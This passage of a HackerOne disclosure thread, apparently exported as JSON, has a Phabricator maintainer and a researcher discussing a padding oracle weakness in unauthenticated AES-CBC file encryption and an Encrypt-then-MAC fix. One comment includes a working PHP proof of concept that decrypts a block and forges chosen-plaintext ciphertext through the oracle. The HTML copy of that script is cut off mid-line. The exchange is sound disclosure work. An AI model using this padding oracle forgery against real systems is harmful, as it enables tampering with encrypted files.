(<code>PR:H</code>).</p>\n\n<blockquote>\n<p>Can you construct a more concerning attack?</p>\n</blockquote>\n\n<p>No. I can only make the two first steps easier with the false sense of security and possibly combining other vulnerabilities. </p>\n\n<p>After doing a little research I found a similar <a href=\"https://hackerone.com/reports/108082\">report</a> that still requires high user privileges, but demonstrates bit flipping an executable fairly well. Please note that the payload would still only be 16 bytes in CBC mode. What do you think? Is this still impractical?</p>\n\n<blockquote>\n<p>Do you think the attack I describe above is actually more concerning than I&#39;m assessing it to be?</p>\n</blockquote>\n\n<p>As stated earlier, while still not a serious issue (2.2 (Low)), the severity of the issue is not <code>None</code> and therefore I believe this should be addressed accordingly (Low priority).</p>\n\n<p>Once again, thank you very much for helping me understand the issue. Do you mind if I give you a shout out on Twitter? :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 1570975, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-29T18:13:48.390Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-29T18:13:48.390Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "> Although Phabricator is not directly to blame here, no encryption is almost better than \"bad\" encryption, since this could potentially give another user (keep in mind I am using the term user to define somebody setting up their own installation of Phabricator) a false sense of security.\n\nAgreed. (This is why I resisted implementing the unprovable S3 \"Encryption\" header.)\n\n> OK, so while very unlikely, a rogue AWS employee could potentially exploit this vulnerability without having to have access to the victim's Phabricator account.\n\nI think they can't realistically build a poisoned ciphertext because we operate in CBC mode -- see below.\n\n> This is a very good idea, but at the same time you should add an authentication mechanism. Some users may ignore checksum mismatches and completely rely on the decryption process ensuring integrity.\n\nOh, I think we're talking about the same thing: I mean that we would store an HMAC hash of each chunk of file data when writing, and refuse to decrypt it if the hash of the ciphertext we read did not match the stored hash (that is, \"Encrypt-then-MAC\").\n\nOn hash mismatch, we'd give the user an error message (like \"This file has been corrupted or tampered with and can not be read.\"). We wouldn't just tell users to manually compare checksums, since I agree that almost no one would do that.\n\n> After doing a little research I found a similar report that still requires high user privileges, but demonstrates bit flipping an executable fairly well. Please note that the payload would still only be 16 bytes in CBC mode. What do you think? Is this still impractical?\n\nI *think* this attack relies on CFB mode, and won't work in CBC mode? In CBC mode, I think you have to search through the entire space for the block and that having a padding oracle doesn't help you, because a one-bit change in the ciphertext cascades to the entire plaintext output block. I may be misunderstanding or unaware of an attack which allows you to reduce the search space, but my belief is that:\n\n  - Given a ciphertext which you want to corrupt, you have to search 2^128 inputs to find a ciphertext which decrypts to a plaintext with 16 chosen bytes if the encryption uses CBC mode with 128-bit blocks.\n  - Having access to a padding oracle doesn't help you narrow down this search space.\n  - In CFB mode (instead of CBC mode), this search is trivial (bit operations on the ciphertext directly impact the decrypted plaintext, so you can construct the poisoned ciphertext directly), which is why the linked attack is realistic.\n\nAssuming I'm not missing anything, you have to search a huge space because we use CBC, and the oracle doesn't help you do this, and verifying a candidate ciphertext takes 100ms+ even if you have a Phabricator account (you have to make an HTTP request and get a response). So I don't think a users with access to S3 or an AWS employee can realistically build a poisoned ciphertext before the heat death of the universe.\n\nMaybe you can compromise S3 and an account, and find a way to tamper with a binary so you only need to change a few bits, and can arrange things so those bits appear at the beginning of a block, and the binary format allows you to corrupt the rest of the file. Then you could verify your poisoned ciphertext in a realistic amount of time. This seems like a very high barrier, but perhaps not an insurmountable one.\n\nOr maybe this attack is easier than I think, but I *believe* using CBC mode makes us mostly resistant to it.\n\nIf users really can blindly construct a chosen plaintext without searching a huge input space, I'd consider this attack sufficiently realistic to place high priority on fixing it in the short term.\n\n> Once again, thank you very much for helping me understand the issue. Do you mind if I give you a shout out on Twitter?\n\nSure. I'm also happy to disclose this as soon as we agree about the remaining details, I just want to make sure I'm not missing anything.", 
            "markdown_message": "<blockquote>\n<p>Although Phabricator is not directly to blame here, no encryption is almost better than &quot;bad&quot; encryption, since this could potentially give another user (keep in mind I am using the term user to define somebody setting up their own installation of Phabricator) a false sense of security.</p>\n</blockquote>\n\n<p>Agreed. (This is why I resisted implementing the unprovable S3 &quot;Encryption&quot; header.)</p>\n\n<blockquote>\n<p>OK, so while very unlikely, a rogue AWS employee could potentially exploit this vulnerability without having to have access to the victim&#39;s Phabricator account.</p>\n</blockquote>\n\n<p>I think they can&#39;t realistically build a poisoned ciphertext because we operate in CBC mode -- see below.</p>\n\n<blockquote>\n<p>This is a very good idea, but at the same time you should add an authentication mechanism. Some users may ignore checksum mismatches and completely rely on the decryption process ensuring integrity.</p>\n</blockquote>\n\n<p>Oh, I think we&#39;re talking about the same thing: I mean that we would store an HMAC hash of each chunk of file data when writing, and refuse to decrypt it if the hash of the ciphertext we read did not match the stored hash (that is, &quot;Encrypt-then-MAC&quot;).</p>\n\n<p>On hash mismatch, we&#39;d give the user an error message (like &quot;This file has been corrupted or tampered with and can not be read.&quot;). We wouldn&#39;t just tell users to manually compare checksums, since I agree that almost no one would do that.</p>\n\n<blockquote>\n<p>After doing a little research I found a similar report that still requires high user privileges, but demonstrates bit flipping an executable fairly well. Please note that the payload would still only be 16 bytes in CBC mode. What do you think? Is this still impractical?</p>\n</blockquote>\n\n<p>I <em>think</em> this attack relies on CFB mode, and won&#39;t work in CBC mode? In CBC mode, I think you have to search through the entire space for the block and that having a padding oracle doesn&#39;t help you, because a one-bit change in the ciphertext cascades to the entire plaintext output block. I may be misunderstanding or unaware of an attack which allows you to reduce the search space, but my belief is that:</p>\n\n<ul>\n<li>Given a ciphertext which you want to corrupt, you have to search 2^128 inputs to find a ciphertext which decrypts to a plaintext with 16 chosen bytes if the encryption uses CBC mode with 128-bit blocks.</li>\n<li>Having access to a padding oracle doesn&#39;t help you narrow down this search space.</li>\n<li>In CFB mode (instead of CBC mode), this search is trivial (bit operations on the ciphertext directly impact the decrypted plaintext, so you can construct the poisoned ciphertext directly), which is why the linked attack is realistic.</li>\n</ul>\n\n<p>Assuming I&#39;m not missing anything, you have to search a huge space because we use CBC, and the oracle doesn&#39;t help you do this, and verifying a candidate ciphertext takes 100ms+ even if you have a Phabricator account (you have to make an HTTP request and get a response). So I don&#39;t think a users with access to S3 or an AWS employee can realistically build a poisoned ciphertext before the heat death of the universe.</p>\n\n<p>Maybe you can compromise S3 and an account, and find a way to tamper with a binary so you only need to change a few bits, and can arrange things so those bits appear at the beginning of a block, and the binary format allows you to corrupt the rest of the file. Then you could verify your poisoned ciphertext in a realistic amount of time. This seems like a very high barrier, but perhaps not an insurmountable one.</p>\n\n<p>Or maybe this attack is easier than I think, but I <em>believe</em> using CBC mode makes us mostly resistant to it.</p>\n\n<p>If users really can blindly construct a chosen plaintext without searching a huge input space, I&#39;d consider this attack sufficiently realistic to place high priority on fixing it in the short term.</p>\n\n<blockquote>\n<p>Once again, thank you very much for helping me understand the issue. Do you mind if I give you a shout out on Twitter?</p>\n</blockquote>\n\n<p>Sure. I&#39;m also happy to disclose this as soon as we agree about the remaining details, I just want to make sure I&#39;m not missing anything.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1571156, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-30T15:30:47.774Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-30T15:30:47.774Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "> Oh, I think we're talking about the same thing: I mean that we would store an HMAC hash of each chunk of file data when writing, and refuse to decrypt it if the hash of the ciphertext we read did not match the stored hash (that is, \"Encrypt-then-MAC\").\n\nOh, I see. Encrypt-then-MAC is authenticated encryption so that would solve this problem.\n\n> In CBC mode, I think you have to search through the entire space for the block and that having a padding oracle doesn't help you, because a one-bit change in the ciphertext cascades to the entire plaintext output block.\n\nCorrect. Bit flipping a CBC block will cause an avalanche effect.\n\n> I may be misunderstanding or unaware of an attack which allows you to reduce the search space [...]\n\nYou can optimise a padding oracle attack. Please keep in mind that all that is needed to perform this type of attack are two consecutive blocks.\n\n* `C\u2032[i]` is the final byte in the `C\u2032` block, which we are sending to the oracle.\n* `P[i]` is the last byte in this block's plaintext, which we have solved for already.\n\nInstead of choosing values for `C\u2032[i]`, you can choose the value for `P[i]` that you want to guess, then solve for `C\u2032[i]`.\n\nOn top of that, this can also be optimised for ASCII text.\n\n> Assuming I'm not missing anything, you have to search a huge space because we use CBC, and the oracle doesn't help you do this, and verifying a candidate ciphertext takes 100ms+ even if you have a Phabricator account (you have to make an HTTP request and get a response). So I don't think a users with access to S3 or an AWS employee can realistically build a poisoned ciphertext before the heat death of the universe.\n\nBy optimising the attack as described above, this should not take too long and is doable.\n\n> Or maybe this attack is easier than I think, but I believe using CBC mode makes us mostly resistant to it.\n\nActually, here is an interesting bit of trivia, padding oracle attacks were originally known as Vaudenay attacks. [Serge Vaudenay](https://lasec.epfl.ch/php_code/publications/search.php?ref=Vau02a) believed that this type of attack was only possible with CBC mode. So CBC padding oracle attacks are far better documented that any other mode.", 
            "markdown_message": "<blockquote>\n<p>Oh, I think we&#39;re talking about the same thing: I mean that we would store an HMAC hash of each chunk of file data when writing, and refuse to decrypt it if the hash of the ciphertext we read did not match the stored hash (that is, &quot;Encrypt-then-MAC&quot;).</p>\n</blockquote>\n\n<p>Oh, I see. Encrypt-then-MAC is authenticated encryption so that would solve this problem.</p>\n\n<blockquote>\n<p>In CBC mode, I think you have to search through the entire space for the block and that having a padding oracle doesn&#39;t help you, because a one-bit change in the ciphertext cascades to the entire plaintext output block.</p>\n</blockquote>\n\n<p>Correct. Bit flipping a CBC block will cause an avalanche effect.</p>\n\n<blockquote>\n<p>I may be misunderstanding or unaware of an attack which allows you to reduce the search space [...]</p>\n</blockquote>\n\n<p>You can optimise a padding oracle attack. Please keep in mind that all that is needed to perform this type of attack are two consecutive blocks.</p>\n\n<ul>\n<li>\n<code>C\u2032[i]</code> is the final byte in the <code>C\u2032</code> block, which we are sending to the oracle.</li>\n<li>\n<code>P[i]</code> is the last byte in this block&#39;s plaintext, which we have solved for already.</li>\n</ul>\n\n<p>Instead of choosing values for <code>C\u2032[i]</code>, you can choose the value for <code>P[i]</code> that you want to guess, then solve for <code>C\u2032[i]</code>.</p>\n\n<p>On top of that, this can also be optimised for ASCII text.</p>\n\n<blockquote>\n<p>Assuming I&#39;m not missing anything, you have to search a huge space because we use CBC, and the oracle doesn&#39;t help you do this, and verifying a candidate ciphertext takes 100ms+ even if you have a Phabricator account (you have to make an HTTP request and get a response). So I don&#39;t think a users with access to S3 or an AWS employee can realistically build a poisoned ciphertext before the heat death of the universe.</p>\n</blockquote>\n\n<p>By optimising the attack as described above, this should not take too long and is doable.</p>\n\n<blockquote>\n<p>Or maybe this attack is easier than I think, but I believe using CBC mode makes us mostly resistant to it.</p>\n</blockquote>\n\n<p>Actually, here is an interesting bit of trivia, padding oracle attacks were originally known as Vaudenay attacks. <a href=\"/redirect?signature=a6989b1800248cb47d626730b4468d606acab1b7&amp;url=https%3A%2F%2Flasec.epfl.ch%2Fphp_code%2Fpublications%2Fsearch.php%3Fref%3DVau02a\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Serge Vaudenay</span><i class=\"icon-external-link\"></i></a> believed that this type of attack was only possible with CBC mode. So CBC padding oracle attacks are far better documented that any other mode.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1573170, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-30T17:35:21.265Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-30T17:35:21.265Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "After fiddling for an hour or two I was able to actually poison ciphertext in practice, which convinces me that this attack is viable in CBC mode. This is not the world's cleanest proof-of-concept, but the shape of the attack is as described above:\n\n  - We use the oracle to discover the plaintext in the second block (in Phabricator, this is not necessary because you can read the plaintext if you can query the oracle, but an oracle plus the ciphertext is sufficient in the general case).\n  - We use the oracle and the discovered plaintext to poison the second block so it decrypts to chosen plaintext.\n  - Although this script doesn't demonstrate it, I believe we can continue working backward to poison an arbitrarily long suffix of the file (but not the entire file).\n  - We end up with one block of garbage which we can not control before any sections we poison, but it's reasonable that this may be acceptable (the ownCloud example is illustrative). I think getting rid of this garbage block is legitimately hard (you really have to search the whole space) but attackers can just build attacks where this doesn't matter.\n  - In the worst case, we only need ~4,000 queries to the oracle per 16-byte block, which is a realistic number of queries to execute even against a network oracle to meaningfully poison a file.\n\nI think there are still a lot of barriers to overcome, but this was the biggest one by a wide margin. We'll pursue a fix for this in the short term. Since this involves a migration and there's some adjacent work in Files I'm not sure I'll get it done in time for the weekly release (in about 30 hours from now), but I'm going to try to make it if nothing else catches on fire between now and then.\n\n(I think AWS employees without accounts still can't mount this attack since they can't query the oracle.)\n\n```php\n<?php\n\ndefine('CIPHER', 'aes-256-cbc');\n\n$plaintext =\n  \"AAAAAAAAAAAAAAAA\".\n  \"BBBBBBBBBBBBBBBB\".\n  \"CCCCCCCCCCCC\";\n\n$key = get_random_bytes(32);\n$iv = get_random_bytes(16);\n\nprint_section('PLAINTEXT', $plaintext);\nprint_section('KEY', $key, true);\nprint_section('IV', $iv, true);\n\n$ciphertext = openssl_encrypt($plaintext, CIPHER, $key, OPENSSL_RAW_DATA, $iv);\nif ($ciphertext === false) {\n  die('Failed to encrypt plaintext.');\n}\n\nprint_section('CIPHERTEXT', $ciphertext, true);\n\n$oracle = array(\n  'key' => $key,\n  'iv' => $iv,\n);\n\noracle_decrypt_attack($ciphertext, $oracle);\noracle_encrypt_attack($ciphertext, $plaintext, $oracle, 'ZZZZZZZZZZZZZZZZ');\n\n\nfunction oracle_decrypt_attack($ciphertext, $oracle) {\n  $blocks = str_split($ciphertext, 16);\n\n  // We're going to fiddle with the first block to find bytes in the second\n  // block.\n  $head_block = $blocks[0];\n  $tail_block = $blocks[1];\n\n  $solved_block = oracle_decrypt_attack_block(\n    $head_block,\n    $tail_block,\n    $oracle);\n\n  print_section('ORACLE DECYPT', $solved_block);\n}\n\nfunction oracle_encrypt_attack($ciphertext, $plaintext, $oracle, $evil_plain) {\n  $blocks = str_split($ciphertext, 16);\n  $head_block = $blocks[0];\n  $tail_block = $blocks[1];\n\n  $plain_blocks = str_split($plaintext, 16);\n  $head_plain = $plain_blocks[0];\n  $tail_plain = $plain_blocks[1];\n\n  $solved_block = oracle_encrypt_attack_block(\n    $head_block,\n    $tail_block,\n    $oracle,\n    $tail_plain,\n    $evil_plain);\n\n  print_section('ORACLE INPUT', $head_block, true);\n  print_section('ORACLE ENCRYPT', $solved_block, true);\n\n  // Now, construct the attack text.\n  $full_attack = $blocks;\n  $full_attack[0] = $solved_block;\n  $full_attack = implode('', $full_attack);\n\n  $key = $oracle['key'];\n  $iv = $oracle['iv'];\n  $result = openssl_decrypt($full_attack, CIPHER, $key, OPENSSL_RAW_DATA, $iv);\n  print_section('ORACLE ATTACK (RAW)', $result);\n  print_section('ORACLE ATTACK (BYTES)', $result, true);\n}\n\nfunction oracle_decrypt_attack_block(\n  $head_block,\n  $tail_block,\n  $oracle) {\n\n  echo \"Performing oracle decryption attack against target block...\\n\";\n\n  $plaintext = array_fill(0, 16, 0);\n  for ($byte = 15; $byte >= 0; $byte--) {\n    $raw_value = ord($head_block[$byte]);\n    $pad_value = (16 - $byte);\n\n    $try_head = $head_block;\n\n    // If we've already guessed some plaintext bytes, first configure the\n    // end of the block to have the right values for those bytes.\n    for ($ii = 15; $ii > $byte; $ii--) {\n      $attack_value = ord($head_block[$ii]) ^ $plaintext[$ii] ^ $pad_value;\n      $try_head[$ii] = chr($attack_value);\n    }\n\n    // Now, guess the last byte, using the padding oracle to verify the value\n    // for the plaintext.\n    for ($guess_byte = 0; $guess_byte <= 255; $guess_byte++) {\n      $try_head[$byte] = chr($raw_value ^ $guess_byte ^ $pad_value);\n\n      $ok = query_oracle($try_head.$tail_block, $oracle);\n      if ($ok) {\n        printf(\n          \"Solved byte %d.\\n\",\n          $byte);\n        $plaintext[$byte] = $guess_byte;\n        break;\n      }\n    }\n  }\n\n  echo \"\\n\";\n\n  // Convert the plaintext back to a string and return it.\n  $result = '';\n  foreach ($plaintext as $ord) {\n    $result .= chr($ord);\n  }\n\n  return $result;\n}\n\nfunction oracle_encrypt_attack_block(\n  $head_block,\n  $tail_block,\n  $oracle,\n  $plain_block,\n  $evil_block) {\n\n  echo \"Performing oracle encryption attack against target block...\\n\";\n\n  $ciphertext = array_fill(0, 16, 0);\n  for ($byte = 15; $byte >= 0; $byte--) {\n    $raw_value = ord($head_block[$byte]);\n    $pad_value = (16 - $byte);\n\n    $try_head = $head_block;\n\n    $known_value = ord($plain_block[$byte]);\n    $evil_value = ord($evil_block[$byte]);\n\n    for ($ii = 15; $ii > $byte; $ii--) {\n      $attack_value =\n        ord($head_block[$ii]) ^\n        ord($plain_block[$ii]) ^\n        $pad_value;\n\n      $try_head[$ii] = chr($attack_value);\n    }\n\n    $solved = false;\n    for ($guess_byte = 0; $guess_byte <= 255; $guess_byte++) {\n      $guess_value =\n        $raw_value ^\n        $guess_byte ^\n        $pad_value ^\n        $known_value ^\n        $evil_value;\n\n      $try_head[$byte] = chr($guess_value);\n\n      $ok = query_oracle($try_head.$tail_block, $oracle);\n      if ($ok) {\n        $solved = true;\n        printf(\n          \"Solved byte %d.\\n\",\n          $byte);\n\n        $ciphertext[$byte] = ord($try_head[$byte]) ^ $pad_value ^ $evil_value;\n\n        break;\n      }\n    }\n\n    if (!$solved) {\n      die(\"Unable to solve byte {$byte}.\\n\");\n    }\n  }\n\n  echo \"\\n\";\n\n  // Convert the plaintext back to a string and return it.\n  $result = '';\n  foreach ($ciphertext as $ord) {\n    $result .= chr($ord);\n  }\n\n  return $result;\n}\n\nfunction query_oracle($guess, $oracle) {\n  $key = $oracle['key'];\n  $iv = $oracle['iv'];\n  $ok = openssl_decrypt($guess, CIPHER, $key, OPENSSL_RAW_DATA, $iv);\n\n  return ($ok !== false);\n}\n\nfunction get_random_bytes($length) {\n  $src = fopen('/dev/urandom', 'rb');\n  if ($src === false) {\n    die('Failed to open /dev/urandom.');\n  }\n\n  $result = fread($src, $length);\n  if ($result === false) {\n    die('Failed to read /dev/urandom.');\n  }\n\n  fclose($src);\n\n  return $result;\n}\n\nfunction print_section($header, $body, $binary = false) {\n  echo $header;\n  echo \"\\n\";\n  if ($binary) {\n    for ($ii = 0; $ii < strlen($body); $ii++) {\n      printf('0x%02x ', ord($body[$ii]));\n    }\n  } else {\n    echo $body;\n  }\n  echo \"\\n\\n\";\n}\n```", 
            "markdown_message": "<p>After fiddling for an hour or two I was able to actually poison ciphertext in practice, which convinces me that this attack is viable in CBC mode. This is not the world&#39;s cleanest proof-of-concept, but the shape of the attack is as described above:</p>\n\n<ul>\n<li>We use the oracle to discover the plaintext in the second block (in Phabricator, this is not necessary because you can read the plaintext if you can query the oracle, but an oracle plus the ciphertext is sufficient in the general case).</li>\n<li>We use the oracle and the discovered plaintext to poison the second block so it decrypts to chosen plaintext.</li>\n<li>Although this script doesn&#39;t demonstrate it, I believe we can continue working backward to poison an arbitrarily long suffix of the file (but not the entire file).</li>\n<li>We end up with one block of garbage which we can not control before any sections we poison, but it&#39;s reasonable that this may be acceptable (the ownCloud example is illustrative). I think getting rid of this garbage block is legitimately hard (you really have to search the whole space) but attackers can just build attacks where this doesn&#39;t matter.</li>\n<li>In the worst case, we only need ~4,000 queries to the oracle per 16-byte block, which is a realistic number of queries to execute even against a network oracle to meaningfully poison a file.</li>\n</ul>\n\n<p>I think there are still a lot of barriers to overcome, but this was the biggest one by a wide margin. We&#39;ll pursue a fix for this in the short term. Since this involves a migration and there&#39;s some adjacent work in Files I&#39;m not sure I&#39;ll get it done in time for the weekly release (in about 30 hours from now), but I&#39;m going to try to make it if nothing else catches on fire between now and then.</p>\n\n<p>(I think AWS employees without accounts still can&#39;t mount this attack since they can&#39;t query the oracle.)</p>\n<pre class=\"highlight php\"><code><span class=\"cp\">&lt;?php</span>\n\n<span class=\"nb\">define</span><span class=\"p\">(</span><span class=\"s1\">&#39;CIPHER&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;aes-256-cbc&#39;</span><span class=\"p\">);</span>\n\n<span class=\"nv\">$plaintext</span> <span class=\"o\">=</span>\n  <span class=\"s2\">&quot;AAAAAAAAAAAAAAAA&quot;</span><span class=\"o\">.</span>\n  <span class=\"s2\">&quot;BBBBBBBBBBBBBBBB&quot;</span><span class=\"o\">.</span>\n  <span class=\"s2\">&quot;CCCCCCCCCCCC&quot;</span><span class=\"p\">;</span>\n\n<span class=\"nv\">$key</span> <span class=\"o\">=</span> <span class=\"nx\">get_random_bytes</span><span class=\"p\">(</span><span class=\"mi\">32</span><span class=\"p\">);</span>\n<span class=\"nv\">$iv</span> <span class=\"o\">=</span> <span class=\"nx\">get_random_bytes</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">);</span>\n\n<span class=\"nx\">print_section</span><span class=\"p\">(</span><span class=\"s1\">&#39;PLAINTEXT&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$plaintext</span><span class=\"p\">);</span>\n<span class=\"nx\">print_section</span><span class=\"p\">(</span><span class=\"s1\">&#39;KEY&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$key</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>\n<span class=\"nx\">print_section</span><span class=\"p\">(</span><span class=\"s1\">&#39;IV&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$iv</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>\n\n<span class=\"nv\">$ciphertext</span> <span class=\"o\">=</span> <span class=\"nb\">openssl_encrypt</span><span class=\"p\">(</span><span class=\"nv\">$plaintext</span><span class=\"p\">,</span> <span class=\"nx\">CIPHER</span><span class=\"p\">,</span> <span class=\"nv\">$key</span><span class=\"p\">,</span> <span class=\"nx\">OPENSSL_RAW_DATA</span><span class=\"p\">,</span> <span class=\"nv\">$iv</span><span class=\"p\">);</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$ciphertext</span> <span class=\"o\">===</span> <span class=\"kc\">false</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">die</span><span class=\"p\">(</span><span class=\"s1\">&#39;Failed to encrypt plaintext.&#39;</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"nx\">print_section</span><span class=\"p\">(</span><span class=\"s1\">&#39;CIPHERTEXT&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$ciphertext</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>\n\n<span class=\"nv\">$oracle</span> <span class=\"o\">=</span> <span class=\"k\">array</span><span class=\"p\">(</span>\n  <span class=\"s1\">&#39;key&#39;</span> <span class=\"o\">=&gt;</span> <span class=\"nv\">$key</span><span class=\"p\">,</span>\n  <span class=\"s1\">&#39;iv&#39;</span> <span class=\"o\">=&gt;</span> <span class=\"nv\">$iv</span><span class=\"p\">,</span>\n<span class=\"p\">);</span>\n\n<span class=\"nx\">oracle_decrypt_attack</span><span class=\"p\">(</span><span class=\"nv\">$ciphertext</span><span class=\"p\">,</span> <span class=\"nv\">$oracle</span><span class=\"p\">);</span>\n<span class=\"nx\">oracle_encrypt_attack</span><span class=\"p\">(</span><span class=\"nv\">$ciphertext</span><span class=\"p\">,</span> <span class=\"nv\">$plaintext</span><span class=\"p\">,</span> <span class=\"nv\">$oracle</span><span class=\"p\">,</span> <span class=\"s1\">&#39;ZZZZZZZZZZZZZZZZ&#39;</span><span class=\"p\">);</span>\n\n\n<span class=\"k\">function</span> <span class=\"nf\">oracle_decrypt_attack</span><span class=\"p\">(</span><span class=\"nv\">$ciphertext</span><span class=\"p\">,</span> <span class=\"nv\">$oracle</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"nv\">$blocks</span> <span class=\"o\">=</span> <span class=\"nb\">str_split</span><span class=\"p\">(</span><span class=\"nv\">$ciphertext</span><span class=\"p\">,</span> <span class=\"mi\">16</span><span class=\"p\">);</span>\n\n  <span class=\"c1\">// We&#39;re going to fiddle with the first block to find bytes in the second\n</span>  <span class=\"c1\">// block.\n</span>  <span class=\"nv\">$head_block</span> <span class=\"o\">=</span> <span class=\"nv\">$blocks</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n  <span class=\"nv\">$tail_block</span> <span class=\"o\">=</span> <span class=\"nv\">$blocks</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">];</span>\n\n  <span class=\"nv\">$solved_block</span> <span class=\"o\">=</span> <span class=\"nx\">oracle_decrypt_attack_block</span><span class=\"p\">(</span>\n    <span class=\"nv\">$head_block</span><span class=\"p\">,</span>\n    <span class=\"nv\">$tail_block</span><span class=\"p\">,</span>\n    <span class=\"nv\">$oracle</span><span class=\"p\">);</span>\n\n  <span class=\"nx\">print_section</span><span class=\"p\">(</span><span class=\"s1\">&#39;ORACLE DECYPT&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$solved_block</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">function</span> <span class=\"nf\">oracle_encrypt_attack</span><span class=\"p\">(</span><span class=\"nv\">$ciphertext</span><span class=\"p\">,</span> <span class=\"nv\">$plaintext</span><span class=\"p\">,</span> <span class=\"nv\">$oracle</span><span class=\"p\">,</span> <span class=\"nv\">$evil_plain</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"nv\">$blocks</span> <span class=\"o\">=</span> <span class=\"nb\">str_split</span><span class=\"p\">(</span><span class=\"nv\">$ciphertext</span><span class=\"p\">,</span> <span class=\"mi\">16</span><span class=\"p\">);</span>\n  <span class=\"nv\">$head_block</span> <span class=\"o\">=</span> <span class=\"nv\">$blocks</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n  <span class=\"nv\">$tail_block</span> <span class=\"o\">=</span> <span class=\"nv\">$blocks</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">];</span>\n\n  <span class=\"nv\">$plain_blocks</span> <span class=\"o\">=</span> <span class=\"nb\">str_split</span><span class=\"p\">(</span><span class=\"nv\">$plaintext</span><span class=\"p\">,</span> <span class=\"mi\">16</span><span class=\"p\">);</span>\n  <span class=\"nv\">$head_plain</span> <span class=\"o\">=</span> <span class=\"nv\">$plain_blocks</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n  <span class=\"nv\">$tail_plain</span> <span class=\"o\">=</span> <span class=\"nv\">$plain_blocks</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">];</span>\n\n  <span class=\"nv\">$solved_block</span> <span class=\"o\">=</span> <span class=\"nx\">oracle_encrypt_attack_block</span><span class=\"p\">(</span>\n    <span class=\"nv\">$head_block</span><span class=\"p\">,</span>\n    <span class=\"nv\">$tail_block</span><span class=\"p\">,</span>\n    <span class=\"nv\">$oracle</span><span class=\"p\">,</span>\n    <span class=\"nv\">$tail_plain</span><span class=\"p\">,</span>\n    <span class=\"nv\">$evil_plain</span><span class=\"p\">);</span>\n\n  <span class=\"nx\">print_section</span><span class=\"p\">(</span><span class=\"s1\">&#39;ORACLE INPUT&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$head_block</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>\n  <span class=\"nx\">print_section</span><span class=\"p\">(</span><span class=\"s1\">&#39;ORACLE ENCRYPT&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$solved_block</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>\n\n  <span class=\"c1\">// Now, construct the attack text.\n</span>  <span class=\"nv\">$full_attack</span> <span class=\"o\">=</span> <span class=\"nv\">$blocks</span><span class=\"p\">;</span>\n  <span class=\"nv\">$full_attack</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nv\">$solved_block</span><span class=\"p\">;</span>\n  <span class=\"nv\">$full_attack</span> <span class=\"o\">=</span> <span class=\"nb\">implode</span><span class=\"p\">(</span><span class=\"s1\">&#39;&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$full_attack</span><span class=\"p\">);</span>\n\n  <span class=\"nv\">$key</span> <span class=\"o\">=</span> <span class=\"nv\">$oracle</span><span class=\"p\">[</span><span class=\"s1\">&#39;key&#39;</span><span class=\"p\">];</span>\n  <span class=\"nv\">$iv</span> <span class=\"o\">=</span> <span class=\"nv\">$oracle</span><span class=\"p\">[</span><span class=\"s1\">&#39;iv&#39;</span><span class=\"p\">];</span>\n  <span class=\"nv\">$result</span> <span class=\"o\">=</span> <span class=\"nb\">openssl_decrypt</span><span class=\"p\">(</span><span class=\"nv\">$full_attack</span><span class=\"p\">,</span> <span class=\"nx\">CIPHER</span><span class=\"p\">,</span> <span class=\"nv\">$key</span><span class=\"p\">,</span> <span class=\"nx\">OPENSSL_RAW_DATA</span><span 